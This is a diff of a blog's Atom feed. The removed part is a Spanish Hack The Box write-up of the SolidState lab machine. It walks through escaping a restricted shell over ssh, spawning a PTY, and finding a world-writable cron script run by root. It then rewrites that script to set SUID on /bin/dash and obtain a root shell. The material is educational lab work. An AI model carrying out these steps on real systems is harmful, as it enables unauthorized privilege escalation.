-&lt;p&gt;Podríamos tratar de escapar de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbash&lt;/code&gt; desde el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh mindy@10.10.10.51 &lt;span class=&quot;s2&quot;&gt;&quot;whoami&quot;&lt;/span&gt;
-mindy@10.10.10.51&lt;span class=&quot;s1&quot;&gt;'s password: 
-mindy
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que a través de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; podemos ejecutar comandos que escapan de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbash&lt;/code&gt;; asi que vamos a ejecutar una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh mindy@10.10.10.51 bash
-mindy@10.10.10.51&lt;span class=&quot;s1&quot;&gt;'s password: 
-whoami
-mindy
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para trabajar mas cómodos, hacemos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; con python:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whereis python
-python: /usr/bin/python /usr/bin/python2.7 /usr/bin/python3.5m /usr/bin/python3.5 /usr/lib/python2.7 /usr/lib/python3.5 /etc/python /etc/python2.7 /etc/python3.5 /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python2.7 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz
-
-python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y ahora si ya podemos visualizar la flag (user.txt) con una tty totalmente interactiva. Ahora necesitamos escalar privilegios, por lo que vamos a enumerar un poco el sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mindy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mindy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mindy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-bash: &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 8
-drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 mindy mindy   33 Nov 18  2020 user.txt
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 28
-drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 4 root  root  4096 Apr 26  2021 ..
-lrwxrwxrwx 1 root  root     9 Nov 18  2020 .bash_history -&amp;gt; /dev/null
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root     0 Aug 22  2017 .bash_logout
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root   338 Aug 22  2017 .bash_profile
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root  1001 Aug 22  2017 .bashrc
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root  root     0 Aug 22  2017 .rhosts
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 root  root     0 Aug 22  2017 .shosts
-drw------- 2 root  root  4096 Apr 26  2021 .ssh
-drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 mindy mindy   33 Nov 18  2020 user.txt
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm 4000 2&amp;gt;/dev/null
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante. Asi que vamos a listar los procesos que se ejecutar en tiempos regualares de tiempo con nuestra herramienta &lt;a href=&quot;/procmon&quot;&gt;ProcMon&lt;/a&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/home/james&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm/
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano procmon.sh
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x procmon.sh 
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh 
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; python /opt/tmp.py
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; python /opt/tmp.py
-&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
-&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; python /opt/tmp.py
-&amp;lt; python /opt/tmp.py
-^C
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se está ejecutando el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tmp.py&lt;/code&gt;, así que vamos a echarle un ojo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 8
-drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 root root  105 Aug 22  2017 tmp.py
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp.py
-&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
-import os
-import sys
-try:
-     os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm -r /tmp/* '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-except:
-     sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que el propietario es el usuario &lt;strong&gt;root&lt;/strong&gt; y que el ejecutar el archivo, borra todo lo que se encuentre en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt;. Si vemos los permisos, tenemos privilegio de lectura, escritura y ejecución y como el usuario &lt;strong&gt;root&lt;/strong&gt; ejecutar el archivo a en intervalos regualres, podemos modificar el contenido del script:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp.py 
-i#!/usr/bin/env python
-import os
-import sys
-try:
-     os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'chmod 4755 /bin/dash'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-except:
-     sys.exit&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/dash
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 124492 Jan 24  2017 /bin/dash
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Esperamos un momento a que el usuario &lt;strong&gt;root&lt;/strong&gt; ejecute el script y tenga permisos SUID la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/dash&lt;/code&gt; &lt;em&gt;Debian Almquist shell&lt;/em&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: En caso de que no se obtenga el permiso SUID, se recomienda reinicar la máquina):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/dash
-&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 124492 Jan 24  2017 /bin/dash
-&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya tenemos los permisos SUID en la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/dash&lt;/code&gt;, así que ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dash&lt;/code&gt; para acceder como &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;debian_chroot&lt;/span&gt;:+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$debian_chroot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;mindy@solidstate:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dash
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somo el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina SolidState en la plataforma de Hack The Box</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="FTP" /><category term="Arbitrary_File_ Upload" /><summary type="html">Resolución de la máquina Devel en la plataforma de Hack The Box</summary></entry></feed>
